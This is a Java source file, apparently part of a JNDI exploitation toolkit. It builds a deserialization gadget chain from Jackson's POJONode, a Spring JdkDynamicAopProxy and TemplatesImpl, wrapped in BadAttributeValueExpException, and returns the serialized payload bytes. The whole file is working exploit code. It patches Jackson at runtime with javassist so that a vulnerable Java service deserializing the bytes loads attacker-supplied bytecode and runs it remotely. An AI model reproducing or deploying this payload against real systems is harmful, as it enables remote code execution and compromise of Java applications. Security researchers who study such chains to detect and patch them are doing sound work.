package map.jndi.gadget;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class Jackson {
    public static byte[] create(TemplatesImpl templatesImpl) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");

        if (!ctClass.isFrozen()) {
            CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(ctMethod);
            ctClass.freeze();
            ctClass.toClass();
        }

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templatesImpl);

        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler jdkDynamicAopProxyHandler = (InvocationHandler) constructor.newInstance(as);

        Templates templatesProxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, jdkDynamicAopProxyHandler);

        POJONode pojoNode = new POJONode(templatesProxy);
        BadAttributeValueExpException e = new BadAttributeValueExpException(null);
        ReflectUtil.setFieldValue(e, "val", pojoNode);

        return SerializeUtil.serialize(e);
    }
}
